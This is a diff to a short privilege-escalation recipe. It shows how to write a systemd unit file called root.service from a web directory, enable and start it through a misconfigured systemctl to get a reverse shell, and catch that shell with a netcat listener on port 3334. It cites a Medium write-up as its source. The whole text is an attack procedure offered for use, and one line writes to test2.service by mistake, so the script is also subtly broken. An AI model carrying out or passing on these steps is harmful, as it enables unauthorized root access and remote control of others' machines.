@@ -1,3 +1,18 @@
+1. Run the following the create a service file reverse shell
+2. set up a listener 
+  nc -lvp 3334
+  
+3. run  
+  systemctl start root
+
+
+
+Ref:
+
+https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
+-----------------------------------------------------------------------------------------------------
+
+
 echo [Unit] > root.service
 echo "Description=root" >> root.service
 echo "" >> root.service
@@ -9,4 +24,3 @@ echo "" >> root.service
 echo [Install] >> test2.service
 echo "WantedBy=multi-user.target" >> root.service
 /bin/systemctl enable /var/www/html/root.service
-/bin/systemctl start root
